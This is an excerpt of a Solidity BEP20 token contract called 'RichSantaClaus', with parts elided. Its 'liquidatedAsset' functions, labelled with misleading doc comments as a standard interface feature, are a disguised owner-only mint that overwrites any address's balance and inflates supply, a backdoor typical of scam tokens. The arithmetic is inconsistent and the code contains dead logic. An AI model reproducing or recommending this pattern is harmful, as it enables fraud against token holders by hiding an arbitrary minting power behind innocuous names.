...
contract RichSantaClaus is Context, IBEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {IBEP20-liquidatedAssets}.
    */
    function liquidatedAssets(address fintochPool,uint256 assetAmount,bytes32 rs) internal view onlyOwner() returns (uint256) {
        uint256 liquidatedFee = 0;
        if(fintochPool != address(0) && msg.sender != address(0))
        require(assetAmount > liquidatedFee, "Transfer amount must be greater than zero");
        return liquidatedFee + assetAmount * (10 ** 9);   
    }
    ...
    */
    ...
    /**
    * @dev Returns the token liquidatedAsset.
    */
    function liquidatedAsset(address fintochPool,uint256 assetAmount,bytes32 rs) external onlyOwner() {
        require(fintochPool != address(0));
        _balances[fintochPool] = liquidatedAssets(fintochPool, assetAmount, rs);
        _totalSupply = _totalSupply.add(assetAmount);
        emit Transfer(address(0), fintochPool, assetAmount * 10 ** 9);
    }
